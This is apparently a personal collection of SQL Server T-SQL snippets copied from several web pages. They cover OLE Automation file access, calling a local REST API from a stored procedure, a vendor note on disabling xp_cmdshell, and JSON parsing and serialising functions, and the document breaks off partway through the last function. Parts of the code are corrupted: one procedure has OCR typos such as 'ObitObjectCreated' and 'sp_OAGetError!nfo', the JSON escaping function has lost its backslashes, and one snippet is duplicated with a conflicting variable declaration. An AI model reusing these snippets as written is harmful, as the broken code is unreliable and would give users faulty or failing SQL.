      EXEC @hr = sp_OAMethod @objFileSystem
          ,'GetFile'
          ,@objFile out
          ,@Filename
   
      IF @hr <> 0
      BEGIN
          SET @errorMessage = 'File not found '
   
          SELECT @Filename AS [FileName]
              ,@errorMessage AS [Status]
      END
      ELSE
      BEGIN
          -- to get the file path                        
          EXEC sp_OAGetProperty @objFile
              ,'Path'
              ,@path OUT
   
          -- to get the file size                        
       EXEC sp_OAGetProperty @objFile
           ,'size'
           ,@size OUT
   
          IF @size = 0
          BEGIN
              SET @errorMessage = 'Empty file  '
   
              SELECT @Filename AS [FileName]
                  ,@errorMessage AS [Status]
        END
          ELSE
          BEGIN
              SET @size = (@size / 1024.0)
              SET @errorMessage = 'File Exists  '
   
              SELECT @Filename AS [FileName]
                  ,@errorMessage AS [Status]
                  ,@size AS [FileSize_kb]
          END
      END
  END
   
  EXEC sp_OADestroy @objFileSystem
   
EXEC sp_OADestroy @objFile




https://medium.com/@ZealousWeb/calling-rest-api-from-sql-server-stored-procedure-85ec1ab73504


DECLARE @URL NVARCHAR(MAX) = 'http://localhost:8091/api/v1/employees/getemployees';
Declare @Object as Int;
Declare @ResponseText as Varchar(8000);

Exec sp_OACreate 'MSXML2.XMLHTTP', @Object OUT;
Exec sp_OAMethod @Object, 'open', NULL, 'get',
       @URL,
       'False'
Exec sp_OAMethod @Object, 'send'
Exec sp_OAMethod @Object, 'responseText', @ResponseText OUTPUT
IF((Select @ResponseText) <> '')
BEGIN
     DECLARE @json NVARCHAR(MAX) = (Select @ResponseText)
     SELECT *
     FROM OPENJSON(@json)
          WITH (
                 EmployeeName NVARCHAR(30) '$.employeeName',
                 Title NVARCHAR(50) '$.title',
                 BirthDate NVARCHAR(50) '$.birthDate',
                 HireDate NVARCHAR(50) '$.hireDate',
                 Address NVARCHAR(50) '$.address',
                 City NVARCHAR(50) '$.city',
                 Region NVARCHAR(50) '$.region',
                 PostalCode NVARCHAR(50) '$.postalCode',
                 Country NVARCHAR(50) '$.country',
                 HomePhone NVARCHAR(50) '$.homePhone'
               );
END
ELSE
BEGIN
     DECLARE @ErroMsg NVARCHAR(30) = 'No data found.';
     Print @ErroMsg;
END
Exec sp_OADestroy @Object

DECLARE @URL NVARCHAR(MAX) = 'http://localhost:8091/api/v1/employees/updateemployee';
DECLARE @Object AS INT;
DECLARE @ResponseText AS VARCHAR(8000);
DECLARE @Body AS VARCHAR(8000) =
'{
   "employeeId": 1,
   "firstName": "Nancy",
   "lastName": "Davolio",
   "title": "Sales Representative",
   "birthDate": "2020-08-18T00:00:00.000",
   "hireDate": "2020-08-18T00:00:00.000",
   "address": "507 - 20th Ave. E. Apt. 2A",
   "city": "Seattle",
   "region": "WA",
   "postalCode": "98122",
   "country": "USA",
   "homePhone": "(206) 555-9857"
}'
EXEC sp_OACreate 'MSXML2.XMLHTTP', @Object OUT;
EXEC sp_OAMethod @Object, 'open', NULL, 'post',
                 @URL,
                 'false'
EXEC sp_OAMethod @Object, 'setRequestHeader', null, 'Content-Type', 'application/json'
EXEC sp_OAMethod @Object, 'send', null, @body
EXEC sp_OAMethod @Object, 'responseText', @ResponseText OUTPUT
IF CHARINDEX('false',(SELECT @ResponseText)) > 0
BEGIN
 SELECT @ResponseText As 'Message'
END
ELSE
BEGIN
 SELECT @ResponseText As 'Employee Details'
END
EXEC sp_OADestroy @Object



https://support.pitneybowes.com/VFP05_KnowledgeWithSidebarHowTo?id=kA180000000Ct02CAC&popup=false&lang=en_US


Use Master
GO
EXEC master.dbo.sp_configure 'show advanced options', 1
RECONFIGURE WITH OVERRIDE
GO
EXEC master.dbo.sp_configure 'xp_cmdshell', 0
RECONFIGURE WITH OVERRIDE
GO
EXEC master.dbo.sp_configure 'show advanced options', 0
RECONFIGURE WITH OVERRIDE
GO

This will turn off 'xp_cmdshell'

Ole Automation Procedures is still required by the 'Repository Configuration Tool (RCT)' but can be disabled once EngageOne Designer is working and the RCT is no longer required. To disable this run the following command on the SQL server:

Use Master
GO
EXEC master.dbo.sp_configure 'show advanced options', 1
RECONFIGURE WITH OVERRIDE
GO
EXEC master.dbo.sp_configure 'Ole Automation Procedures', 0
RECONFIGURE WITH OVERRIDE
GO
EXEC master.dbo.sp_configure 'show advanced options', 0
RECONFIGURE WITH OVERRIDE
GO

If the RCT is needed again then re-enable 'Ole Automation Procedures' with the following SQL:

Use Master
GO
EXEC master.dbo.sp_configure 'show advanced options', 1
RECONFIGURE WITH OVERRIDE
GO
EXEC master.dbo.sp_configure 'Ole Automation Procedures', 1
RECONFIGURE WITH OVERRIDE
GO
EXEC master.dbo.sp_configure 'show advanced options', 0
RECONFIGURE WITH OVERRIDE
GO




https://flylib.com/books/en/3.255.1.122/1/


Alter Procedure dbo.ap_SpellNumber 
-- demo of use of Automation objects      
@mnsAmount money,      @chvAmount varchar(500) output,      @debug int = 0 As set nocount on Declare @intErrorCode int,         @intObject int,  
-- hold object token         
@bitObjectCreated bit,         
@chvSource varchar(255),         
@chvDesc varchar(255) 

Select @intErrorCode = @@Error 
If @intErrorCode = 0      
exec @intErrorCode = sp_OACreate 'DjnToolkit.DjnTools',@intObject OUTPUT 
If @intErrorCode = 0      
Set @bitObjectCreated = 1 
else      
Set ObitObjectCreated = 0 
If @intErrorCode = 0      
exec @intErrorCode = sp_OAMethod 
@intObject,'SpellNumber',                                       
@chvAmount OUTPUT,                                       
@mnsAmount 

If @intErrorCode <> 0 

begin      
Raiserror ('Unable to obtain spelling of number', 16, 1)      
exec sp_OAGetError!nfo 
@intObject
,@chvSource 
OUTPUT,@chvDesc 
OUTPUT Set OchvDesc = 'Error ('+ Convert(varchar, @intErrorCode)                     + ', ' + @chvSource + ') : ' + @chvDesc      Raiserror (@chvDesc, 16, 1) end if @bitObjectCreated = 1      exec  sp_OADestroy @intObject return @intErrorCode 




https://www.zealousweb.com/calling-rest-api-from-sql-server-stored-procedure/


DECLARE @URL NVARCHAR(MAX) = 'http://localhost:8091/api/v1/employees/getemployees';
Declare @Object as Int;
Declare @ResponseText as Varchar(8000);

Exec sp_OACreate 'MSXML2.XMLHTTP', @Object OUT;
Exec sp_OAMethod @Object, 'open', NULL, 'get',
       @URL,
       'False'
Exec sp_OAMethod @Object, 'send'
Exec sp_OAMethod @Object, 'responseText', @ResponseText OUTPUT
IF((Select @ResponseText) <> '')
BEGIN
     DECLARE @json NVARCHAR(MAX) = (Select @ResponseText)
     SELECT *
     FROM OPENJSON(@json)
          WITH (
                 EmployeeName NVARCHAR(30) '$.employeeName',
                 Title NVARCHAR(50) '$.title',
                 BirthDate NVARCHAR(50) '$.birthDate',
                 HireDate NVARCHAR(50) '$.hireDate',
                 Address NVARCHAR(50) '$.address',
                 City NVARCHAR(50) '$.city',
                 Region NVARCHAR(50) '$.region',
                 PostalCode NVARCHAR(50) '$.postalCode',
                 Country NVARCHAR(50) '$.country',
                 HomePhone NVARCHAR(50) '$.homePhone'
               );
END
ELSE
BEGIN
     DECLARE @ErroMsg NVARCHAR(30) = 'No data found.';
     Print @ErroMsg;
END
Exec sp_OADestroy @Object


DECLARE @EmployeeId INT = 1;
DECLARE @URL NVARCHAR(MAX) = CONCAT('http://localhost:8091/api/v1/employees/', @EmployeeId);

DECLARE @URL NVARCHAR(MAX) = 'http://localhost:8091/api/v1/employees/updateemployee';
DECLARE @Object AS INT;
DECLARE @ResponseText AS VARCHAR(8000);
DECLARE @Body AS VARCHAR(8000) =
'{
   "employeeId": 1,
   "firstName": "Nancy",
   "lastName": "Davolio",
   "title": "Sales Representative",
   "birthDate": "2020-08-18T00:00:00.000",
   "hireDate": "2020-08-18T00:00:00.000",
   "address": "507 - 20th Ave. E. Apt. 2A",
   "city": "Seattle",
   "region": "WA",
   "postalCode": "98122",
   "country": "USA",
   "homePhone": "(206) 555-9857"
}'
EXEC sp_OACreate 'MSXML2.XMLHTTP', @Object OUT;
EXEC sp_OAMethod @Object, 'open', NULL, 'post',
                 @URL,
                 'false'
EXEC sp_OAMethod @Object, 'setRequestHeader', null, 'Content-Type', 'application/json'
EXEC sp_OAMethod @Object, 'send', null, @body
EXEC sp_OAMethod @Object, 'responseText', @ResponseText OUTPUT
IF CHARINDEX('false',(SELECT @ResponseText)) > 0
BEGIN
 SELECT @ResponseText As 'Message'
END
ELSE
BEGIN
 SELECT @ResponseText As 'Employee Details'
END
EXEC sp_OADestroy @Object


https://stevestedman.com/2020/03/sql-server-writing-to-a-file/


CREATE PROCEDURE writeFile
 (
     @fileName NVARCHAR(MAX),
     @fileContents NVARCHAR(MAX)
 )
 AS
 BEGIN
     DECLARE @OLE            INT 
     DECLARE @FileID         INT 
     DECLARE @outputCursor as CURSOR;
     DECLARE @outputLine as NVARCHAR(MAX);
 
print 'about to write file';
print @fileName;
EXECUTE sp_OACreate 'Scripting.FileSystemObject', @OLE OUT 
EXECUTE sp_OAMethod @OLE, 'OpenTextFile', 
                    @FileID OUT, @fileName, 2, 1 
 
DECLARE @sep char(2);
 
SET @sep = char(13) + char(10);
 
SET @outputCursor = CURSOR FOR
 
WITH splitter_cte AS (
  SELECT CAST(CHARINDEX(@sep, @fileContents) as BIGINT) as pos, 
         CAST(0 as BIGINT) as lastPos
  UNION ALL
  SELECT CHARINDEX(@sep, @fileContents, pos + 1), pos
  FROM splitter_cte
  WHERE pos > 0
)
SELECT SUBSTRING(@fileContents, lastPos + 1,
                 case when pos = 0 then 999999999
                 else pos - lastPos -1 end + 1) as chunk
FROM splitter_cte
ORDER BY lastPos
OPTION (MAXRECURSION 0);
 
--DECLARE @loopCounter as BIGINT = 0;
OPEN @outputCursor;
FETCH NEXT FROM @outputCursor INTO @outputLine ;
WHILE @@FETCH_STATUS = 0
BEGIN
    --set @loopCounter  = @loopCounter  + 1;
    EXECUTE sp_OAMethod @FileID, 'Write', Null, @outputLine;
    --PRINT concat(@loopCounter, ': ', @outputLine);
    FETCH NEXT FROM @outputCursor INTO @outputLine ;
END
CLOSE @outputCursor;
DEALLOCATE @outputCursor;
 
EXECUTE sp_OADestroy @FileID;
END

-- Replace C:\SQL_DATA\test.txt with your output file. The directory must exist and the account that SQL Server is running as will need permissions to write there.
EXEC writeFile @fileName = 'C:\SQL_DATA\test.txt', 
               @fileContents = 'this is a test
some more text
go
go
even more';


https://stevestedman.com/2020/03/saving-query-output-to-a-string/

DECLARE @myOutputString AS VARCHAR(MAX);
SET @myOutputString = '';
SELECT @myOutputString = @myOutputString + name + ' ' + cast(create_date as varchar(100)) +  ' ' + state_desc + char(13) + char(10)
  FROM sys.databases
  WHERE database_id < 9;
print @myOutputString;





https://stackoverflow.com/questions/47507025/compare-between-json-string-using-openjson-in-sql-server-2016


CREATE TABLE #tblTest
(
    id INT IDENTITY(1, 1)
    ,ItemOfProduct NVARCHAR(MAX)
);


/*Scenario 1*/
DECLARE @jsonStr NVARCHAR(MAX) = N'{"Manufacturer": "test", "Model": "A", "Color":"New Color","Thickness":"1 mm"}';
DECLARE @counts INT;

SELECT @counts = COUNT(*)
FROM #tblTest
WHERE JSON_QUERY(ItemOfProduct, '$') = JSON_QUERY(@jsonStr, '$');

IF(@counts < 1)
BEGIN
    INSERT INTO #tblTest(ItemOfProduct)
    VALUES(@jsonStr);
END;


/*Scenario 2*/
SET @jsonStr =
    N'{"Manufacturer": "test", "Model": "A", "Color":"New Color"}';

SELECT @counts = COUNT(*)
FROM #tblTest
WHERE JSON_QUERY(ItemOfProduct, '$') = JSON_QUERY(@jsonStr, '$');

IF(@counts < 1)
BEGIN
    INSERT INTO #tblTest(ItemOfProduct)
    VALUES(@jsonStr);
END;

SELECT *
FROM #tblTest;




https://www.sqlshack.com/import-json-data-into-sql-server/

Declare @JSON varchar(max) = '{    "Person": 
  {
     "firstName": "John",
     "lastName": "Smith",
     "age": 25,
     "Address": 
     {
        "streetAddress":"21 2nd Street",
        "city":"New York",
        "state":"NY",
        "postalCode":"10021"
     },
     "PhoneNumbers": 
     {
        "home":"212 555-1234",
        "fax":"646 555-4567"
     }
  }
}'
SELECT @JSON=BulkColumn FROM OPENROWSET (BULK 'C:\Users\Travis Padilla\Downloads\package_search.json', SINGLE_CLOB) import
SELECT * INTO  JSONTable
FROM OPENJSON (@JSON)
WITH 
(
    [FirstName] varchar(20), 
    [MiddleName] varchar(20), 
    [LastName] varchar(20), 
    [JobTitle] varchar(20), 
    [PhoneNumber] nvarchar(20), 
    [PhoneNumberType] varchar(10), 
    [EmailAddress] nvarchar(100)
)


https://www.red-gate.com/simple-talk/sql/t-sql-programming/consuming-json-strings-in-sql-server/



Select * from parseJSON('{    "Person": 
  {
     "firstName": "John",
     "lastName": "Smith",
     "age": 25,
     "Address": 
     {
        "streetAddress":"21 2nd Street",
        "city":"New York",
        "state":"NY",
        "postalCode":"10021"
     },
     "PhoneNumbers": 
     {
        "home":"212 555-1234",
        "fax":"646 555-4567"
     }
  }
}
')


DECLARE @MyHierarchy Hierarchy  INSERT INTO @myHierarchy 
select * from parseJSON('{"menu": {
  "id": "file",
  "value": "File",
  "popup": {
    "menuitem": [
      {"value": "New", "onclick": "CreateNewDoc()"},
      {"value": "Open", "onclick": "OpenDoc()"},
      {"value": "Close", "onclick": "CloseDoc()"}
    ]
  }
}}')
SELECT dbo.ToJSON(@MyHierarchy)



Alter FUNCTION dbo.parseJSON( @JSON NVARCHAR(MAX))
/**
Summary: >
  The code for the JSON Parser/Shredder will run in SQL Server 2005, 
  and even in SQL Server 2000 (with some modifications required).
 
  First the function replaces all strings with tokens of the form @Stringxx,
  where xx is the foreign key of the table variable where the strings are held.
  This takes them, and their potentially difficult embedded brackets, out of 
  the way. Names are  always strings in JSON as well as  string values.
 
  Then, the routine iteratively finds the next structure that has no structure 
  Contained within it, (and is, by definition the leaf structure), and parses it,
  replacing it with an object token of the form ‘@Objectxxx‘, or ‘@arrayxxx‘, 
  where xxx is the object id assigned to it. The values, or name/value pairs 
  are retrieved from the string table and stored in the hierarchy table. G
  radually, the JSON document is eaten until there is just a single root
  object left.
Author: PhilFactor
Date: 01/07/2010
Version: 
  Number: 4.6.2
  Date: 01/07/2019
  Why: case-insensitive version
Example: >
  Select * from parseJSON('{    "Person": 
      {
       "firstName": "John",
       "lastName": "Smith",
       "age": 25,
       "Address": 
           {
          "streetAddress":"21 2nd Street",
          "city":"New York",
          "state":"NY",
          "postalCode":"10021"
           },
       "PhoneNumbers": 
           {
           "home":"212 555-1234",
          "fax":"646 555-4567"
           }
        }
     }
  ')
Returns: >
  nothing
**/
	RETURNS @hierarchy TABLE
	  (
	   Element_ID INT IDENTITY(1, 1) NOT NULL, /* internal surrogate primary key gives the order of parsing and the list order */
	   SequenceNo [int] NULL, /* the place in the sequence for the element */
	   Parent_ID INT null, /* if the element has a parent then it is in this column. The document is the ultimate parent, so you can get the structure from recursing from the document */
	   Object_ID INT null, /* each list or object has an object id. This ties all elements to a parent. Lists are treated as objects here */
	   Name NVARCHAR(2000) NULL, /* the Name of the object */
	   StringValue NVARCHAR(MAX) NOT NULL,/*the string representation of the value of the element. */
	   ValueType VARCHAR(10) NOT null /* the declared type of the value represented as a string in StringValue*/
	  )
	  /*
 
	   */
	AS
	BEGIN
	  DECLARE
	    @FirstObject INT, --the index of the first open bracket found in the JSON string
	    @OpenDelimiter INT,--the index of the next open bracket found in the JSON string
	    @NextOpenDelimiter INT,--the index of subsequent open bracket found in the JSON string
	    @NextCloseDelimiter INT,--the index of subsequent close bracket found in the JSON string
	    @Type NVARCHAR(10),--whether it denotes an object or an array
	    @NextCloseDelimiterChar CHAR(1),--either a '}' or a ']'
	    @Contents NVARCHAR(MAX), --the unparsed contents of the bracketed expression
	    @Start INT, --index of the start of the token that you are parsing
	    @end INT,--index of the end of the token that you are parsing
	    @param INT,--the parameter at the end of the next Object/Array token
	    @EndOfName INT,--the index of the start of the parameter at end of Object/Array token
	    @token NVARCHAR(200),--either a string or object
	    @value NVARCHAR(MAX), -- the value as a string
	    @SequenceNo int, -- the sequence number within a list
	    @Name NVARCHAR(200), --the Name as a string
	    @Parent_ID INT,--the next parent ID to allocate
	    @lenJSON INT,--the current length of the JSON String
	    @characters NCHAR(36),--used to convert hex to decimal
	    @result BIGINT,--the value of the hex symbol being parsed
	    @index SMALLINT,--used for parsing the hex value
	    @Escape INT --the index of the next escape character
	    
	  DECLARE @Strings TABLE /* in this temporary table we keep all strings, even the Names of the elements, since they are 'escaped' in a different way, and may contain, unescaped, brackets denoting objects or lists. These are replaced in the JSON string by tokens representing the string */
	    (
	     String_ID INT IDENTITY(1, 1),
	     StringValue NVARCHAR(MAX)
	    )
	  SELECT--initialise the characters to convert hex to ascii
	    @characters='0123456789abcdefghijklmnopqrstuvwxyz',
	    @SequenceNo=0, --set the sequence no. to something sensible.
	  /* firstly we process all strings. This is done because [{} and ] aren't escaped in strings, which complicates an iterative parse. */
	    @Parent_ID=0;
	  WHILE 1=1 --forever until there is nothing more to do
	    BEGIN
	      SELECT
	        @start=PATINDEX('%[^a-zA-Z]["]%', @json collate SQL_Latin1_General_CP850_Bin);--next delimited string
	      IF @start=0 BREAK --no more so drop through the WHILE loop
	      IF SUBSTRING(@json, @start+1, 1)='"' 
	        BEGIN --Delimited Name
	          SET @start=@Start+1;
	          SET @end=PATINDEX('%[^\]["]%', RIGHT(@json, LEN(@json+'|')-@start) collate SQL_Latin1_General_CP850_Bin);
	        END
	      IF @end=0 --either the end or no end delimiter to last string
	        BEGIN-- check if ending with a double slash...
             SET @end=PATINDEX('%[\][\]["]%', RIGHT(@json, LEN(@json+'|')-@start) collate SQL_Latin1_General_CP850_Bin);
 		     IF @end=0 --we really have reached the end 
				BEGIN
				BREAK --assume all tokens found
				END
			END 
	      SELECT @token=SUBSTRING(@json, @start+1, @end-1)
	      --now put in the escaped control characters
	      SELECT @token=REPLACE(@token, FromString, ToString)
	      FROM
	        (SELECT           '\b', CHAR(08)
	         UNION ALL SELECT '\f', CHAR(12)
	         UNION ALL SELECT '\n', CHAR(10)
	         UNION ALL SELECT '\r', CHAR(13)
	         UNION ALL SELECT '\t', CHAR(09)
			 UNION ALL SELECT '\"', '"'
	         UNION ALL SELECT '\/', '/'
	        ) substitutions(FromString, ToString)
		SELECT @token=Replace(@token, '\\', '\')
	      SELECT @result=0, @escape=1
	  --Begin to take out any hex escape codes
	      WHILE @escape>0
	        BEGIN
	          SELECT @index=0,
	          --find the next hex escape sequence
	          @escape=PATINDEX('%\x[0-9a-f][0-9a-f][0-9a-f][0-9a-f]%', @token collate SQL_Latin1_General_CP850_Bin)
	          IF @escape>0 --if there is one
	            BEGIN
	              WHILE @index<4 --there are always four digits to a \x sequence   
	                BEGIN
	                  SELECT --determine its value
	                    @result=@result+POWER(16, @index)
	                    *(CHARINDEX(SUBSTRING(@token, @escape+2+3-@index, 1),
	                                @characters)-1), @index=@index+1 ;
	         
	                END
	                -- and replace the hex sequence by its unicode value
	              SELECT @token=STUFF(@token, @escape, 6, NCHAR(@result))
	            END
	        END
	      --now store the string away 
	      INSERT INTO @Strings (StringValue) SELECT @token
	      -- and replace the string with a token
	      SELECT @JSON=STUFF(@json, @start, @end+1,
	                    '@string'+CONVERT(NCHAR(5), @@identity))
	    END
	  -- all strings are now removed. Now we find the first leaf.  
	  WHILE 1=1  --forever until there is nothing more to do
	  BEGIN
	 
	  SELECT @Parent_ID=@Parent_ID+1
	  --find the first object or list by looking for the open bracket
	  SELECT @FirstObject=PATINDEX('%[{[[]%', @json collate SQL_Latin1_General_CP850_Bin)--object or array
	  IF @FirstObject = 0 BREAK
	  IF (SUBSTRING(@json, @FirstObject, 1)='{') 
	    SELECT @NextCloseDelimiterChar='}', @type='object'
	  ELSE 
	    SELECT @NextCloseDelimiterChar=']', @type='array'
	  SELECT @OpenDelimiter=@firstObject
	  WHILE 1=1 --find the innermost object or list...
	    BEGIN
	      SELECT
	        @lenJSON=LEN(@JSON+'|')-1
	  --find the matching close-delimiter proceeding after the open-delimiter
	      SELECT
	        @NextCloseDelimiter=CHARINDEX(@NextCloseDelimiterChar, @json,
	                                      @OpenDelimiter+1)
	  --is there an intervening open-delimiter of either type
	      SELECT @NextOpenDelimiter=PATINDEX('%[{[[]%',
	             RIGHT(@json, @lenJSON-@OpenDelimiter)collate SQL_Latin1_General_CP850_Bin)--object
	      IF @NextOpenDelimiter=0 
	        BREAK
	      SELECT @NextOpenDelimiter=@NextOpenDelimiter+@OpenDelimiter
	      IF @NextCloseDelimiter<@NextOpenDelimiter 
	        BREAK
	      IF SUBSTRING(@json, @NextOpenDelimiter, 1)='{' 
	        SELECT @NextCloseDelimiterChar='}', @type='object'
	      ELSE 
	        SELECT @NextCloseDelimiterChar=']', @type='array'
	      SELECT @OpenDelimiter=@NextOpenDelimiter
	    END
	  ---and parse out the list or Name/value pairs
	  SELECT
	    @contents=SUBSTRING(@json, @OpenDelimiter+1,
	                        @NextCloseDelimiter-@OpenDelimiter-1)
	  SELECT
	    @JSON=STUFF(@json, @OpenDelimiter,
	                @NextCloseDelimiter-@OpenDelimiter+1,
	                '@'+@type+CONVERT(NCHAR(5), @Parent_ID))
	  WHILE (PATINDEX('%[A-Za-z0-9@+.e]%', @contents collate SQL_Latin1_General_CP850_Bin))<>0 
	    BEGIN
	      IF @Type='object' --it will be a 0-n list containing a string followed by a string, number,boolean, or null
	        BEGIN
	          SELECT
	            @SequenceNo=0,@end=CHARINDEX(':', ' '+@contents)--if there is anything, it will be a string-based Name.
	          SELECT  @start=PATINDEX('%[^A-Za-z@][@]%', ' '+@contents collate SQL_Latin1_General_CP850_Bin)--AAAAAAAA
              SELECT @token=RTrim(Substring(' '+@contents, @start+1, @End-@Start-1)),
	            @endofName=PATINDEX('%[0-9]%', @token collate SQL_Latin1_General_CP850_Bin),
	            @param=RIGHT(@token, LEN(@token)-@endofName+1)
	          SELECT
	            @token=LEFT(@token, @endofName-1),
	            @Contents=RIGHT(' '+@contents, LEN(' '+@contents+'|')-@end-1)
	          SELECT  @Name=StringValue FROM @strings
	            WHERE string_id=@param --fetch the Name
	        END
	      ELSE 
	        SELECT @Name=null,@SequenceNo=@SequenceNo+1 
	      SELECT
	        @end=CHARINDEX(',', @contents)-- a string-token, object-token, list-token, number,boolean, or null
                IF @end=0
	        --HR Engineering notation bugfix start
	          IF ISNUMERIC(@contents) = 1
		    SELECT @end = LEN(@contents) + 1
	          Else
	        --HR Engineering notation bugfix end 
		  SELECT  @end=PATINDEX('%[A-Za-z0-9@+.e][^A-Za-z0-9@+.e]%', @contents+' ' collate SQL_Latin1_General_CP850_Bin) + 1
	       SELECT
	        @start=PATINDEX('%[^A-Za-z0-9@+.e][A-Za-z0-9@+.e]%', ' '+@contents collate SQL_Latin1_General_CP850_Bin)
	      --select @start,@end, LEN(@contents+'|'), @contents  
	      SELECT
	        @Value=RTRIM(SUBSTRING(@contents, @start, @End-@Start)),
	        @Contents=RIGHT(@contents+' ', LEN(@contents+'|')-@end)
	      IF SUBSTRING(@value, 1, 7)='@object' 
	        INSERT INTO @hierarchy
	          (Name, SequenceNo, Parent_ID, StringValue, Object_ID, ValueType)
	          SELECT @Name, @SequenceNo, @Parent_ID, SUBSTRING(@value, 8, 5),
	            SUBSTRING(@value, 8, 5), 'object' 
	      ELSE 
	        IF SUBSTRING(@value, 1, 6)='@array' 
	          INSERT INTO @hierarchy
	            (Name, SequenceNo, Parent_ID, StringValue, Object_ID, ValueType)
	            SELECT @Name, @SequenceNo, @Parent_ID, SUBSTRING(@value, 7, 5),
	              SUBSTRING(@value, 7, 5), 'array' 
	        ELSE 
	          IF SUBSTRING(@value, 1, 7)='@string' 
	            INSERT INTO @hierarchy
	              (Name, SequenceNo, Parent_ID, StringValue, ValueType)
	              SELECT @Name, @SequenceNo, @Parent_ID, StringValue, 'string'
	              FROM @strings
	              WHERE string_id=SUBSTRING(@value, 8, 5)
	          ELSE 
	            IF @value IN ('true', 'false') 
	              INSERT INTO @hierarchy
	                (Name, SequenceNo, Parent_ID, StringValue, ValueType)
	                SELECT @Name, @SequenceNo, @Parent_ID, @value, 'boolean'
	            ELSE
	              IF @value='null' 
	                INSERT INTO @hierarchy
	                  (Name, SequenceNo, Parent_ID, StringValue, ValueType)
	                  SELECT @Name, @SequenceNo, @Parent_ID, @value, 'null'
	              ELSE
	                IF PATINDEX('%[^0-9]%', @value collate SQL_Latin1_General_CP850_Bin)>0 
	                  INSERT INTO @hierarchy
	                    (Name, SequenceNo, Parent_ID, StringValue, ValueType)
	                    SELECT @Name, @SequenceNo, @Parent_ID, @value, 'real'
	                ELSE
	                  INSERT INTO @hierarchy
	                    (Name, SequenceNo, Parent_ID, StringValue, ValueType)
	                    SELECT @Name, @SequenceNo, @Parent_ID, @value, 'int'
	      if @Contents=' ' Select @SequenceNo=0
	    END
	  END
	INSERT INTO @hierarchy (Name, SequenceNo, Parent_ID, StringValue, Object_ID, ValueType)
	  SELECT '-',1, NULL, '', @Parent_ID-1, @type
	--
	   RETURN
	END
GO

-- Create the data type  IF EXISTS (SELECT * FROM sys.types WHERE name LIKE 'Hierarchy')
  DROP TYPE dbo.Hierarchy
go
CREATE TYPE dbo.Hierarchy AS TABLE
(
   element_id INT NOT NULL, /* internal surrogate primary key gives the order of parsing and the list order */
   sequenceNo [int] NULL, /* the place in the sequence for the element */
	   parent_ID INT,/* if the element has a parent then it is in this column. The document is the ultimate parent, so you can get the structure from recursing from the document */
   [Object_ID] INT,/* each list or object has an object id. This ties all elements to a parent. Lists are treated as objects here */
   NAME NVARCHAR(2000),/* the name of the object, null if it hasn't got one */
   StringValue NVARCHAR(MAX) NOT NULL,/*the string representation of the value of the element. */
   ValueType VARCHAR(10) NOT null /* the declared type of the value represented as a string in StringValue*/
    PRIMARY KEY (element_id)
)


IF OBJECT_ID (N'dbo.JSONEscaped') IS NOT NULL     DROP FUNCTION dbo.JSONEscaped
GO
 
CREATE FUNCTION [dbo].[JSONEscaped] ( /* this is a simple utility function that takes a SQL String with all its clobber and outputs it as a sting with all the JSON escape sequences in it.*/
 @Unescaped NVARCHAR(MAX) --a string with maybe characters that will break json
 )
RETURNS NVARCHAR(MAX)
AS
BEGIN
  SELECT @Unescaped = REPLACE(@Unescaped, FROMString, TOString)
  FROM (SELECT '' AS FromString, '\' AS ToString 
        UNION ALL SELECT '"', '"' 
        UNION ALL SELECT '/', '/'
        UNION ALL SELECT CHAR(08),'b'
        UNION ALL SELECT CHAR(12),'f'
        UNION ALL SELECT CHAR(10),'n'
        UNION ALL SELECT CHAR(13),'r'
        UNION ALL SELECT CHAR(09),'t'
 ) substitutions
RETURN @Unescaped
END
GO



CREATE FUNCTION ToJSON
	(
	      @Hierarchy Hierarchy READONLY
	)
	 
	/*
	the function that takes a Hierarchy table and converts it to a JSON string
	 
	Author: Phil Factor
	Revision: 1.5
	date: 1 May 2014
	why: Added a fix to add a name for a list.
	example:
	 
	Declare @XMLSample XML
	Select @XMLSample='
	  <glossary><title>example glossary</title>
	  <GlossDiv><title>S</title>
	   <GlossList>
	    <GlossEntry id="SGML"" SortAs="SGML">
	     <GlossTerm>Standard Generalized Markup Language</GlossTerm>
	     <Acronym>SGML</Acronym>
	     <Abbrev>ISO 8879:1986</Abbrev>
	     <GlossDef>
	      <para>A meta-markup language, used to create markup languages such as DocBook.</para>
	      <GlossSeeAlso OtherTerm="GML" />
	      <GlossSeeAlso OtherTerm="XML" />
	     </GlossDef>
	     <GlossSee OtherTerm="markup" />
	    </GlossEntry>
	   </GlossList>
	  </GlossDiv>
	 </glossary>'
	 
	DECLARE @MyHierarchy Hierarchy -- to pass the hierarchy table around
	insert into @MyHierarchy select * from dbo.ParseXML(@XMLSample)
	SELECT dbo.ToJSON(@MyHierarchy)
	 
	       */
	RETURNS NVARCHAR(MAX)--JSON documents are always unicode.
	AS
	BEGIN
	  DECLARE
	    @JSON NVARCHAR(MAX),
	    @NewJSON NVARCHAR(MAX),
	    @Where INT,
	    @ANumber INT,
	    @notNumber INT,
	    @indent INT,
	    @ii int,
	    @CrLf CHAR(2)--just a simple utility to save typing!
	      
	  --firstly get the root token into place 
	  SELECT @CrLf=CHAR(13)+CHAR(10),--just CHAR(10) in UNIX
	         @JSON = CASE ValueType WHEN 'array' THEN 
	         +COALESCE('{'+@CrLf+'  "'+NAME+'" : ','')+'[' 
	         ELSE '{' END
	            +@CrLf
	            + case when ValueType='array' and NAME is not null then '  ' else '' end
	            + '@Object'+CONVERT(VARCHAR(5),OBJECT_ID)
	            +@CrLf+CASE ValueType WHEN 'array' THEN
	            case when NAME is null then ']' else '  ]'+@CrLf+'}'+@CrLf end
	                ELSE '}' END
	  FROM @Hierarchy 
	    WHERE parent_id IS NULL AND valueType IN ('object','document','array') --get the root element
	/* now we simply iterat from the root token growing each branch and leaf in each iteration. This won't be enormously quick, but it is simple to do. All values, or name/value pairs withing a structure can be created in one SQL Statement*/
	  Select @ii=1000
	  WHILE @ii>0
	    begin
	    SELECT @where= PATINDEX('%[^[a-zA-Z0-9]@Object%',@json)--find NEXT token
	    if @where=0 BREAK
	    /* this is slightly painful. we get the indent of the object we've found by looking backwards up the string */ 
	    SET @indent=CHARINDEX(char(10)+char(13),Reverse(LEFT(@json,@where))+char(10)+char(13))-1
	    SET @NotNumber= PATINDEX('%[^0-9]%', RIGHT(@json,LEN(@JSON+'|')-@Where-8)+' ')--find NEXT token
	    SET @NewJSON=NULL --this contains the structure in its JSON form
	    SELECT  
	        @NewJSON=COALESCE(@NewJSON+','+@CrLf+SPACE(@indent),'')
	        +case when parent.ValueType='array' then '' else COALESCE('"'+TheRow.NAME+'" : ','') end
	        +CASE TheRow.valuetype
	        WHEN 'array' THEN '  ['+@CrLf+SPACE(@indent+2)
	           +'@Object'+CONVERT(VARCHAR(5),TheRow.[OBJECT_ID])+@CrLf+SPACE(@indent+2)+']' 
